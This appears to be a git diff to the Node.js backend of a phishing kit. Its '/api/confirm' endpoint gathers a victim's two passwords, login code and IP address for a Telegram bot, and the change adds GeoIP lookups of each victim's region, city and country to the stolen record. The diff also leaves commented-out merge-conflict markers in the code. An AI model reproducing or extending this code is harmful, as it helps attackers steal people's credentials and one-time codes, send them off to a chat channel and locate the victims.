@@ -4,6 +4,8 @@ const axios = require('axios');
 const cors = require('cors'); 
 const app = express();
 const IP = require('ip');
+const requestIp = require('request-ip')
+const { lookup } = require('geoip-lite');
 require('dotenv').config();
 const port = 3000; // Choose an appropriate port
 
@@ -11,15 +13,25 @@ const port = 3000; // Choose an appropriate port
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Replace with your actual chat ID
 
-app.use(bodyParser.json());
-app.use(cors())
+//app.use(bodyParser.json());
+//<<<<<<< HEAD
+//app.use(cors())
 // app.listen(80, function () {
   //console.log('CORS-enabled web server listening on port 80')
 //})
 
+//app.get('/', (req, res) => {
+  //  const clientIp = (req.headers['x-forwarded-for'] || '').split(',')[0] || req.socket.remoteAddress// This will give you the client's IP address
+    //
+//=======
+app.use(cors());
+
 app.get('/', (req, res) => {
     const clientIp = (req.headers['x-forwarded-for'] || '').split(',')[0] || req.socket.remoteAddress// This will give you the client's IP address
-    
+//  // ip address of the user
+//     console.log(clientIp)
+    console.log(lookup(clientIp))
+//>>>>>>> 2c0e9631b7b925d02db32a42f25d441aafd96e79
     res.send(`Client IP: ${clientIp}`);
   })
 app.post('/api/confirm', async (req, res) => {
@@ -41,6 +53,7 @@ app.post('/api/confirm', async (req, res) => {
         First Password: ${filteredData.first_password || 'N/A'}
         Second Password: ${filteredData.second_password || 'N/A'}
         LoginCODE: ${filteredData.logincode || 'N/A'}
+        Address: ${lookup(ipAddress).region || 'N/A'}, ${lookup(ipAddress).city || 'N/A'}, ${lookup(ipAddress).country || 'N/A'}
         IP Address: ${ipAddress}
     `;
 
